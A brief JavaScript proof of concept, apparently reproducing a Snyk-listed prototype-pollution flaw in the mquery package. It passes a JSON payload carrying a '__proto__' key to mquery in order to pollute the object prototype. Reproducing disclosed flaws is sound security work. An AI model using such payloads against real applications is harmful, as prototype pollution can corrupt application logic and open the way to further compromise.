//https://snyk.io/vuln/SNYK-JS-MQUERY-1050858
 
  const mquery = require("mquery");
  let obj = {};
  var payload = JSON.parse('{"__proto__": {"polluted": "yes"}}');

   

  var m = mquery(payload);
// End of file
